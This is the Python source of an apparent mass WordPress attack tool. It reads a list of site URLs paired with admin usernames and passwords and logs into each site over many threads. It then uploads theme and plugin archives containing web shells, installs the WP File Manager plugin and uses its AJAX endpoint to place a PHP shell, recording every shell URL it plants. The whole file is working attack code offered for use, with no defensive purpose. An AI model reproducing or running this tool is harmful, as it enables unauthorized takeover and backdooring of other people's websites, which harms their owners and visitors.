# import module
import requests
import os
import configparser
import sys
import re
import random
import time
import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
from pathlib import Path
import platform
from colorama import Fore, init

# Initialize colorama with proper Windows support
init(autoreset=True, convert=True, strip=False)
requests.urllib3.disable_warnings()

VERSION = 1.2

# Cross-platform color handling
class Colors:
    def __init__(self):
        # Ensure colorama works properly on Windows
        if platform.system().lower() == 'windows':
            os.system('')  # Enable ANSI colors on Windows 10+
        
        self.red = Fore.RED
        self.yellow = Fore.YELLOW
        self.reset = Fore.RESET
        self.green = Fore.GREEN

colors = Colors()
red = colors.red
yellow = colors.yellow
reset = colors.reset
green = colors.green

def clear_screen():
    """Cross-platform screen clearing"""
    try:
        if platform.system().lower() == 'windows':
            os.system('cls')
        else:
            os.system('clear')
    except:
        # Fallback if os.system fails
        print('\n' * 50)

def get_safe_path(*args):
    """Create OS-safe paths using pathlib"""
    return str(Path(*args))

def get_working_directory():
    """Get current working directory in OS-safe format"""
    return str(Path.cwd())

def file_exists(filepath):
    """Check if file exists using pathlib"""
    return Path(filepath).exists()

def read_file_safe(filepath, encoding='utf-8'):
    """Safe file reading with proper encoding handling"""
    try:
        # Try multiple encodings for Windows compatibility
        encodings = [encoding, 'utf-8', 'cp1252', 'iso-8859-1']
        
        for enc in encodings:
            try:
                with open(filepath, 'r', encoding=enc) as f:
                    return f.read()
            except UnicodeDecodeError:
                continue
        
        # If all encodings fail, try binary read
        with open(filepath, 'rb') as f:
            content = f.read()
            # Try to decode as UTF-8 with error handling
            return content.decode('utf-8', errors='replace')
            
    except Exception as e:
        sys.exit(f"{red}ERROR:{reset} Unable to read {filepath}: {str(e)}")

def write_file_safe(filepath, content, mode='a+'):
    """Safe file writing with proper encoding"""
    try:
        # Ensure directory exists
        Path(filepath).parent.mkdir(parents=True, exist_ok=True)
        
        with open(filepath, mode, encoding='utf-8', errors='replace') as f:
            f.write(content + "\n")
    except Exception as e:
        print(f"{red}ERROR:{reset} Unable to write to {filepath}: {str(e)}")

def ensure_result_directory():
    """Create Result directory if it doesn't exist"""
    result_dir = Path("Result")
    result_dir.mkdir(exist_ok=True)
    return result_dir

def get_timestamp():
    """Get current timestamp for logging"""
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def save_result(filename, content, add_timestamp=True):
    """Save result to Result/ directory with timestamp"""
    try:
        result_dir = ensure_result_directory()
        filepath = result_dir / filename
        
        # Add timestamp to content if requested
        if add_timestamp:
            timestamp = get_timestamp()
            final_content = f"[{timestamp}] {content}"
        else:
            final_content = content
            
        write_file_safe(str(filepath), final_content, mode='a+')
        
    except Exception as e:
        print(f"{red}ERROR:{reset} Unable to save result: {str(e)}")

def count_results():
    """Count results in Result/ directory"""
    try:
        result_dir = Path("Result")
        if not result_dir.exists():
            return {}
            
        counts = {}
        result_files = {
            "wpfilemanager_found.txt": "WP File Manager Found",
            "wpfilemanager_installed.txt": "WP File Manager Installed", 
            "themes_uploaded.txt": "Themes Uploaded",
            "plugins_uploaded.txt": "Plugins Uploaded",
            "shells_uploaded.txt": "Shells Uploaded"
        }
        
        for filename, description in result_files.items():
            filepath = result_dir / filename
            if filepath.exists():
                with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
                    lines = [line.strip() for line in f.readlines() if line.strip()]
                    counts[description] = len(lines)
            else:
                counts[description] = 0
                
        return counts
        
    except Exception as e:
        print(f"{red}ERROR:{reset} Unable to count results: {str(e)}")
        return {}

def display_results_summary():
    """Display summary of results"""
    try:
        counts = count_results()
        if not counts:
            print(f"\n[{yellow}INFO{reset}] No results found")
            return
            
        print(f"\n{'='*60}")
        print(f"{green}RESULTS SUMMARY{reset}")
        print(f"{'='*60}")
        
        total = 0
        for description, count in counts.items():
            if count > 0:
                print(f"[{green}\u2713{reset}] {description}: {yellow}{count}{reset}")
                total += count
            else:
                print(f"[{red}\u2717{reset}] {description}: {count}")
        
        print(f"{'='*60}")
        print(f"[{green}Total Success{reset}]: {yellow}{total}{reset}")
        print(f"[{green}Results saved in{reset}]: {yellow}Result/{reset} directory")
        print(f"{'='*60}")
        
    except Exception as e:
        print(f"{red}ERROR:{reset} Unable to display summary: {str(e)}")

def save_session_info(targets_count, thread_count):
    """Save session information"""
    try:
        session_info = f"Session started with {targets_count} targets using {thread_count} threads"
        save_result("session_log.txt", session_info)
    except Exception as e:
        print(f"{red}ERROR:{reset} Unable to save session info: {str(e)}")

def failed(url: str, msg: str):
    print(f"[{yellow}#{reset}] {url} --> [{red}{msg}{reset}]")

def vuln(url: str, msg: str):
    print(f"[{yellow}#{reset}] {url} --> [{green}{msg}{reset}]")

def random_name():
    let = "abcdefghijklmnopqrstuvwxyz1234567890"
    random_theme_name = ''.join(random.choice(let) for _ in range(8))
    return random_theme_name

def read_content_file(file_name: str):
    return read_file_safe(file_name)

class Login:
    def __init__(self, url, username: str = "", password: str = "", themes_zip: str = None, plugins_zip: str = None) -> None:
        self.sessions = requests.Session()
        self.url = url
        self.username = username
        self.password = password
        
        # Use default paths if not provided
        if themes_zip is None:
            themes_zip = get_safe_path("Files", "themes.zip")
        if plugins_zip is None:
            plugins_zip = get_safe_path("Files", "plugins.zip")
            
        self.themes_zip = themes_zip
        self.plugins_zip = plugins_zip
        self.cookies = {}
        
        # Enhanced headers for better compatibility
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        
        self.random_name = random_name()
        self.url_user_pwd = self.url + "/wp-login.php" + "#" + self.username + "@" + self.password

    def save_into_file(self, filename, content: str):
        """Save results to Result/ directory with timestamp"""
        save_result(filename, content)

    def check_files(self):
        """Check if required files exist"""
        if not file_exists(self.themes_zip) or not file_exists(self.plugins_zip):
            print(f"{red}ERROR:{reset} Required files not found:")
            print(f"  Themes: {self.themes_zip} - {'Found' if file_exists(self.themes_zip) else 'Missing'}")
            print(f"  Plugins: {self.plugins_zip} - {'Found' if file_exists(self.plugins_zip) else 'Missing'}")
            return False
        return True
    
    def get_nonce(self, type):
        paths = {
            "plugin": "/wp-admin/plugin-install.php",
            "themes": "/wp-admin/theme-install.php?browse=popular",
            "upload": "/wp-admin/admin.php?page=wp_file_manager",
            "wpfilemanager": "/wp-admin/plugin-install.php?s=file%2520manager&tab=search&type=term"
        }
        
        path = paths.get(type, paths["plugin"])
        
        try:
            response = self.sessions.get(
                self.url + path, 
                headers=self.headers, 
                verify=False, 
                timeout=15,
                allow_redirects=True
            )
            
            getText = response.text
            
            if type in ["plugin", "themes"]:
                extrack_nonce = re.search('id="_wpnonce" name="_wpnonce" value="(.*?)"', getText)
            elif type == "upload":
                getText = getText.replace('\/', '/')
                pattern = f'var fmfparams = {{"ajaxurl":"{re.escape(self.url)}/wp-admin/admin-ajax.php","nonce":"(.*?)"'
                extrack_nonce = re.search(pattern, getText)
            else:  # wpfilemanager
                if "wp-file-manager/images/wp_file_manager.svg" in getText:
                    vuln(self.url_user_pwd, "Wp_File_Manager_Installed")
                    self.save_into_file("wpfilemanager_found.txt", self.url_user_pwd)
                    self.upload_shell()
                    return "found"
                extrack_nonce = re.search('var _wpUpdatesSettings = {"ajax_nonce":"(.*?)"};', getText)
            
            if extrack_nonce:
                nonce = extrack_nonce.group(1)
                return nonce
            else:
                failed(self.url, "Failed_get_nonce")
                
        except requests.exceptions.Timeout:
            failed(self.url, "Timeout")
        except Exception as e:
            failed(self.url, f"Error_get_nonce: {str(e)}")
        
        return None

    def get_cookies(self):
        try:
            response = self.sessions.get(
                self.url, 
                headers=self.headers, 
                verify=False, 
                timeout=15,
                allow_redirects=True
            )
            self.cookies = dict(response.cookies)
            return True
        except requests.exceptions.Timeout:
            failed(self.url, "Timeout")
            return False
        except Exception as e:
            failed(self.url, f"Error_get_cookies: {str(e)}")
            return False

    def check_valid_login(self):
        url_dash = self.url.replace('wp-login.php', 'wp-admin')
        payload = {
            'log': self.username, 
            'pwd': self.password, 
            'wp-submit': 'Log+In', 
            'redirect_to': f'{url_dash}/', 
            'testcookie': '1'
        }
        
        for attempt in range(2):
            try:
                req = self.sessions.post(
                    self.url, 
                    data=payload, 
                    headers=self.headers, 
                    verify=False, 
                    timeout=15, 
                    cookies=self.cookies,
                    allow_redirects=True
                )
                
                success_indicators = ['dashboard', '/wp-admin/admin-ajax.php', "adminpage", "/wp-admin/"]
                
                if any(indicator in req.text for indicator in success_indicators) or "/wp-admin/" in req.url:
                    vuln(self.url + "#" + self.username + "@" + self.password, "Valid_Login")
                    return True
                else:
                    failed(self.url + "#" + self.username + "@" + self.password, f"Not_Valid_{attempt + 1}")
                    payload['redirect_to'] = url_dash
                    
            except requests.exceptions.Timeout:
                failed(self.url, "Timeout")
                return False
            except Exception as e: 
                failed(self.url + "#" + self.username + "@" + self.password, f"Error_when_try_login: {str(e)}")
                return False
        
        return False

    def upload_shell(self):
        shell_name = self.random_name + '.php'
        nonce = self.get_nonce('upload')
        
        if not nonce:
            return False
            
        data = {
            'reqid': '18efa290e4235f',
            'cmd': 'upload',
            'target': 'l1_Lw',
            'action': 'mk_file_folder_manager',
            '_wpnonce': nonce,
            'networkhref': '',
            'mtime[]': int(time.time())
        }
        
        files = {
            'upload[]': (shell_name, SHELL, 'application/x-php')
        }
        
        try:
            # Check existing files
            check_url = f'{self.url}/wp-admin/admin-ajax.php?action=mk_file_folder_manager&_wpnonce={nonce}&networkhref=&cmd=ls&target=l1_Lw&intersect[]={shell_name}&reqid=18efa290e4235f'
            req = self.sessions.get(check_url, headers=self.headers, timeout=15)
            
            if req.status_code == 200:
                try:
                    req_json = req.json()
                    if req_json.get('list'):
                        data[f"hashes[{list(req_json['list'].keys())[0]}]"] = shell_name
                except:
                    pass  # Continue without hash if JSON parsing fails
            
            # Upload shell
            upload = self.sessions.post(
                self.url + '/wp-admin/admin-ajax.php', 
                headers=self.headers, 
                timeout=20, 
                verify=False, 
                data=data, 
                files=files
            )
            
            if upload.status_code == 200:
                try:
                    upload_json = upload.json()
                    if upload_json.get('added'):
                        for item in upload_json['added']:
                            shell_path = item.get('url')
                            if shell_path:
                                # Verify shell upload
                                check_shell = requests.get(
                                    shell_path, 
                                    headers=self.headers, 
                                    timeout=10, 
                                    verify=False
                                ).text
                                
                                if "GrazzMean" in check_shell or "shell bypass 403" in check_shell:
                                    vuln(self.url_user_pwd, 'Upload_Shell')
                                    self.save_into_file('shells_uploaded.txt', shell_path)
                                    return True
                        
                        failed(self.url_user_pwd, 'Shell_Not_Working')
                    else:
                        failed(self.url_user_pwd, 'Upload_Shell_Failed')
                except Exception as e:
                    failed(self.url_user_pwd, f'Upload_Shell_Parse_Error: {str(e)}')
            else:
                failed(self.url_user_pwd, f'Upload_Shell_HTTP_Error: {upload.status_code}')
                
        except Exception as e:
            failed(self.url_user_pwd, f'Upload_Shell_Error: {str(e)}')
        
        return False

    def install_wpfilemanager(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }

        data = {
            "slug": "wp-file-manager",
            "action": "install-plugin",
            "_ajax_nonce": "",
            "_fs_nonce": "",
            "username": "",
            "password": "",
            "connection_type": "",
            "public_key": "",
            "private_key": ""
        }

        try:
            getNonce = self.get_nonce("wpfilemanager")
            
            if getNonce == "found":
                return True
            elif getNonce:
                data['_ajax_nonce'] = getNonce
                
                installPlugin = self.sessions.post(
                    self.url + "/wp-admin/admin-ajax.php", 
                    headers=headers, 
                    timeout=30, 
                    verify=False, 
                    data=data, 
                    cookies=self.cookies
                )
                
                if installPlugin.status_code == 200:
                    try:
                        response_data = installPlugin.json()
                        
                        if response_data.get('success'):
                            vuln(self.url_user_pwd, "Install_WpFileManager")
                            
                            activate_url = response_data.get('data', {}).get('activateUrl')
                            if activate_url:
                                activatePlugin = self.sessions.get(
                                    activate_url, 
                                    headers=self.headers, 
                                    timeout=15,
                                    verify=False
                                )
                                
                                if (activatePlugin.status_code == 200 or 
                                    "wp-file-manager/images/wp_file_manager.svg" in activatePlugin.text):     
                                    vuln(self.url_user_pwd, "Activate_WpFileManager")
                                    self.save_into_file("wpfilemanager_installed.txt", self.url_user_pwd)
                                    return True
                                else:
                                    failed(self.url_user_pwd, "Activate_WpFileManager")
                            else:
                                failed(self.url_user_pwd, "No_Activate_URL")
                        else:
                            failed(self.url_user_pwd, "Install_Failed")
                    except Exception as e:
                        failed(self.url_user_pwd, f"JSON_Parse_Error: {str(e)}")
                else:
                    failed(self.url_user_pwd, f"Install_HTTP_Error: {installPlugin.status_code}")
            else:
                failed(self.url_user_pwd, "No_Nonce_Found")
                
        except requests.exceptions.Timeout:
            failed(self.url, "Timeout")
        except Exception as e:
            failed(self.url_user_pwd, f"WpFileManager_Error: {str(e)}")
        
        return False

    def upload_themes(self):
        nonce = self.get_nonce("themes")
        if not nonce:
            return False
            
        data = {
            '_wpnonce': nonce, 
            '_wp_http_referer': '/wp-admin/theme-install.php', 
            'install-theme-submit': 'Installer'
        }
        
        try:
            with open(self.themes_zip, 'rb') as theme_file:
                files_up = {
                    'themezip': (f'{self.random_name}.zip', theme_file, 'application/zip')
                }
                
                upThemes = self.sessions.post(
                    self.url + "/wp-admin/update.php?action=upload-theme", 
                    headers=self.headers, 
                    cookies=self.cookies, 
                    files=files_up, 
                    data=data, 
                    verify=False, 
                    timeout=30
                )
                
            if upThemes.status_code == 200:
                vuln(self.url_user_pwd, "Upload_Themes")
                self.save_into_file("themes_uploaded.txt", self.url_user_pwd)
                
                # Check for shell
                shell_paths = [
                    f'/wp-content/themes/{self.random_name}/maw-themes.php',
                    f'/wp-content/themes/{self.random_name}/Uploader.php'
                ]
                
                for shell_path in shell_paths:
                    try:
                        req = requests.get(
                            self.url + shell_path, 
                            headers=self.headers, 
                            timeout=10,
                            verify=False
                        )
                        
                        if req.status_code == 200 and "Maw3six" in req.text:
                            vuln(self.url + shell_path, "Shell_uploaded")
                            self.save_into_file("shells_uploaded.txt", self.url + shell_path)
                            return True
                            
                    except Exception as e:
                        failed(self.url_user_pwd, f"Error_check_shell: {str(e)}")
                        continue
                        
                failed(self.url_user_pwd, "themes_Shell_Not_Uploaded")
            else:
                failed(self.url_user_pwd, f"themes_Failed: HTTP {upThemes.status_code}")
                
        except requests.exceptions.Timeout:
            failed(self.url, "Timeout")
        except FileNotFoundError:
            failed(self.url_user_pwd, f"Theme_File_Not_Found: {self.themes_zip}")
        except Exception as e:
            failed(self.url_user_pwd, f"Error_upload_themes: {str(e)}")
        
        return False

    def upload_plugins(self):
        nonce = self.get_nonce("plugin")
        if not nonce:
            return False
            
        data = {
            '_wpnonce': nonce, 
            '_wp_http_referer': '/wp-admin/plugin-install.php', 
            'install-plugin-submit': 'Install Now'
        }
        
        try:
            with open(self.plugins_zip, 'rb') as plugin_file:
                files_up = {
                    'pluginzip': (f'{self.random_name}.zip', plugin_file, 'application/zip')
                }
                
                upPlugin = self.sessions.post(
                    self.url + "/wp-admin/update.php?action=upload-plugin", 
                    headers=self.headers, 
                    cookies=self.cookies, 
                    files=files_up, 
                    data=data, 
                    verify=False, 
                    timeout=30
                )
                
            if upPlugin.status_code == 200:
                vuln(self.url_user_pwd, "Upload_Plugins")
                self.save_into_file("plugins_uploaded.txt", self.url_user_pwd)
                
                # Check for shell
                shell_paths = [
                    f'/wp-content/plugins/{self.random_name}/maw-plugins.php',
                    f'/wp-content/plugins/{self.random_name}/Uploader.php'
                ]
                
                for shell_path in shell_paths:
                    try:
                        req = requests.get(
                            self.url + shell_path, 
                            headers=self.headers, 
                            timeout=10,
                            verify=False
                        )
                        
                        if req.status_code == 200 and "Maw3six" in req.text:
                            vuln(self.url + shell_path, "Shell_uploaded")
                            self.save_into_file("shells_uploaded.txt", self.url + shell_path)
                            return True
                            
                    except Exception as e:
                        failed(self.url_user_pwd, f"Error_check_shell: {str(e)}")
                        continue
                        
                failed(self.url_user_pwd, "Plugins_Shell_Not_Uploaded")
            else:
                failed(self.url_user_pwd, f"Plugins_Failed: HTTP {upPlugin.status_code}")
                
        except requests.exceptions.Timeout:
            failed(self.url, "Timeout")
        except FileNotFoundError:
            failed(self.url_user_pwd, f"Plugin_File_Not_Found: {self.plugins_zip}")
        except Exception as e:
            failed(self.url_user_pwd, f"Error_upload_plugins: {str(e)}")
        
        return False

    def start(self):
        if not self.check_files():
            return False
            
        if not self.get_cookies():
            return False
            
        if self.check_valid_login():
            self.url = self.url.replace("/wp-login.php", "")
            
            # Try upload themes first
            themes_success = self.upload_themes()
            
            # Try upload plugins if themes failed
            if not themes_success:
                self.upload_plugins()
            
            # Try install and use wp-file-manager
            if self.install_wpfilemanager():
                self.upload_shell()
            
            return True
        
        return False

def parse_domain(url):
    """
    Enhanced URL parsing function that supports multiple formats:
    1. Format 1 (original): https://example.com/wp-login.php#admin@password
    2. Format 2 (colon): https://example.com/wp-login.php:admin:password  
    3. Format 3 (pipe): https://example.com/wp-login.php|admin|password
    """
    
    url = url.strip()
    
    # Check for pipe separator (|)
    if '|' in url:
        parts = url.split('|')
        if len(parts) >= 3:
            base_url = parts[0].strip()
            user = parts[1].strip()
            pwd = '|'.join(parts[2:]).strip()  # Handle passwords with pipe characters
            return base_url, user, pwd
        else:
            failed(url, "Invalid_Pipe_Format")
            return None, None, None
    
    # Check for colon separator after domain (:)
    elif ':' in url and url.count(':') > 2:  # More than 2 colons (https:// = 1, port = optional)
        colon_indices = [i for i, char in enumerate(url) if char == ':']
        if len(colon_indices) >= 3:  # https:// + credentials
            second_last_colon = colon_indices[-2]
            last_colon = colon_indices[-1]
            
            base_url = url[:second_last_colon].strip()
            user = url[second_last_colon + 1:last_colon].strip()
            pwd = url[last_colon + 1:].strip()
            
            return base_url, user, pwd
        else:
            failed(url, "Invalid_Colon_Format")
            return None, None, None
    
    # Check for hash separator (original format)
    elif '#' in url:
        try:
            parsed_url = urlparse(url)
            base_url = parsed_url.scheme + '://' + parsed_url.netloc + parsed_url.path.replace('//', '/')
            credentials = parsed_url.fragment
            
            if credentials and '@' in credentials:
                if credentials.count('@') >= 2:
                    parts = credentials.split('@')
                    user = parts[0].strip()
                    pwd = '@'.join(parts[1:]).strip()  # Rejoin password parts with @
                else:
                    user, pwd = credentials.split('@', 1)
                    user = user.strip()
                    pwd = pwd.strip()
                
                return base_url, user, pwd
            else:
                failed(url, "Invalid_Hash_Format")
                return None, None, None
        except Exception as e:
            failed(url, f"Parse_Error: {str(e)}")
            return None, None, None
    
    # No recognized format
    else:
        failed(url, "Unsupported_Format")
        return None, None, None

def start(target):
    """Process a single target"""
    url, user, pwd = parse_domain(target)
    
    if not url or not user or not pwd:
        failed(target, "Failed_Parsing")
        return
        
    try:
        if themes_zip and plugins_zip:
            login_instance = Login(url, username=user, password=pwd, themes_zip=themes_zip, plugins_zip=plugins_zip)
        else:
            login_instance = Login(url, username=user, password=pwd)
            
        login_instance.start()
        
    except Exception as e:
        failed(target, f"Execution_Error: {str(e)}")

def get_config():
    """Load configuration with cross-platform path handling"""
    global SHELL
    
    config = configparser.ConfigParser()
    config_file = "config.ini"
    
    try:
        if not file_exists(config_file):
            print(f"{red}ERROR:{reset} config.ini not found")
            return False
            
        config.read(config_file, encoding='utf-8')
        
        # Get paths from config
        if 'paths' in config:
            themes_path = config['paths']['themes']
            plugins_path = config['paths']['plugins']
            shell_path = config['paths']['shell']
        else:
            # Fallback to old format
            if platform.system().lower() == 'windows':
                section = 'path_windows'
            else:
                section = 'path_linux'
                
            themes_path = config[section]['themes']
            plugins_path = config[section]['plugins']
            shell_path = config['shell']['shell']
        
        # Convert to absolute paths
        working_dir = get_working_directory()
        themes_zip_path = get_safe_path(working_dir, themes_path)
        plugins_zip_path = get_safe_path(working_dir, plugins_path)
        shell_file_path = get_safe_path(working_dir, shell_path)
        
        # Read shell content
        SHELL = read_content_file(shell_file_path)
        
        # Verify files exist
        if file_exists(themes_zip_path) and file_exists(plugins_zip_path):
            return themes_zip_path, plugins_zip_path
        else:
            print(f"{red}ERROR:{reset} Required files not found:")
            print(f"  Themes: {themes_zip_path} - {'Found' if file_exists(themes_zip_path) else 'Missing'}")
            print(f"  Plugins: {plugins_zip_path} - {'Found' if file_exists(plugins_zip_path) else 'Missing'}")
            print(f"  Shell: {shell_file_path} - {'Found' if file_exists(shell_file_path) else 'Missing'}")
            return False
            
    except Exception as e:
        print(f"{red}ERROR:{reset} Configuration error: {str(e)}")
        return False

def get_input_file():
    """Get input file with proper error handling"""
    while True:
        try:
            file_path = input(f"[{green}Input your list{reset}] --> ").strip()
            if not file_path:
                print(f"{red}ERROR:{reset} Please provide a file path")
                continue
                
            if not file_exists(file_path):
                print(f"{red}ERROR:{reset} File not found: {file_path}")
                continue
                
            return file_path
            
        except KeyboardInterrupt:
            print(f"\n{yellow}Cancelled by user{reset}")
            sys.exit(0)
        except Exception as e:
            print(f"{red}ERROR:{reset} {str(e)}")

def get_thread_count():
    """Get thread count with validation"""
    while True:
        try:
            thread_input = input(f"[{green}Thread{reset}] -> ").strip()
            if not thread_input:
                return 10  # Default
                
            thread_count = int(thread_input)
            if thread_count <= 0:
                print(f"{red}ERROR:{reset} Thread count must be positive")
                continue
            elif thread_count > 50:
                print(f"{yellow}WARNING:{reset} High thread count may cause issues. Recommended: 10-20")
                
            return thread_count
            
        except ValueError:
            print(f"{red}ERROR:{reset} Please enter a valid number")
        except KeyboardInterrupt:
            print(f"\n{yellow}Cancelled by user{reset}")
            sys.exit(0)

def main():
    """Main function with enhanced error handling"""
    global themes_zip, plugins_zip
    
    # System info for debugging
    system_info = f"Python {sys.version.split()[0]} on {platform.system()} {platform.release()}"
    
    banner = rf"""
___________                        _________                      __  .__    .__                 
\__    ___/__.__.______   ____    /   _____/ ____   _____   _____/  |_|  |__ |__| ____    ____   
  |    | <   |  |\____ \_/ __ \   \_____  \ /  _ \ /     \_/ __ \   __\  |  \|  |/    \  / ___\  
  |    |  \___  ||  |_> >  ___/   /        (  <_> )  Y Y  \  ___/|  | |   Y  \  |   |  \/ /_/  > 
  |____|  / ____||   __/ \___  > /_______  /\____/|__|_|  /\___  >__| |___|  /__|___|  /\___  /  
          \/     |__|        \/          \/             \/     \/          \/        \//_____/   
            Version : {yellow}{VERSION}{reset} | System: {yellow}{system_info}{reset}

--> [{green}Desc{reset}] This tool uploads plugins, themes, and installs wp-file-manager
--> [{yellow}Supported Formats{reset}]:
    Format 1: https://example.com/wp-login.php#admin@password
    Format 2: https://example.com/wp-login.php:admin:password
    Format 3: https://example.com/wp-login.php|admin|password

--> [{green}Cross-Platform Compatible{reset}] Works on Windows, Linux, macOS
"""
    
    print(banner)
    
    # Load configuration
    config_result = get_config()
    if config_result:
        themes_zip, plugins_zip = config_result
        print(f"[{green}✓{reset}] Configuration loaded successfully")
        print(f"  Themes: {themes_zip}")
        print(f"  Plugins: {plugins_zip}")
    else:
        print(f"[{red}✗{reset}] Configuration failed")
        return
    
    try:
        # Get input file
        file_path = get_input_file()
        
        # Read and process targets
        content = read_file_safe(file_path)
        targets = list(dict.fromkeys(content.splitlines()))  # Remove duplicates while preserving order
        targets = [target.strip() for target in targets if target.strip()]  # Remove empty lines
        
        if not targets:
            print(f"{red}ERROR:{reset} No valid targets found in file")
            return
            
        print(f"[{green}✓{reset}] Loaded {len(targets)} targets")
        
        # Get thread count
        thread_count = get_thread_count()
        print(f"[{green}✓{reset}] Using {thread_count} threads")
        
        # Save session info
        save_session_info(len(targets), thread_count)
        
        print(f"\n[{yellow}Starting attack...{reset}]")
        print(f"[{green}All results will be saved to Result/ directory{reset}]")
        print(f"{'='*60}\n")
        
        # Execute with thread pool
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            executor.map(start, targets)
            
        print(f"\n{'='*60}")
        print(f"[{green}✓{reset}] Attack completed")
        
        # Display results summary
        display_results_summary()
        
    except KeyboardInterrupt:
        print(f"\n{yellow}Cancelled by user{reset}")
    except Exception as e:
        print(f"\n{red}ERROR:{reset} {str(e)}")
        import traceback
        print(f"{red}Debug info:{reset} {traceback.format_exc()}")

if __name__ == "__main__":
    clear_screen()
    main()
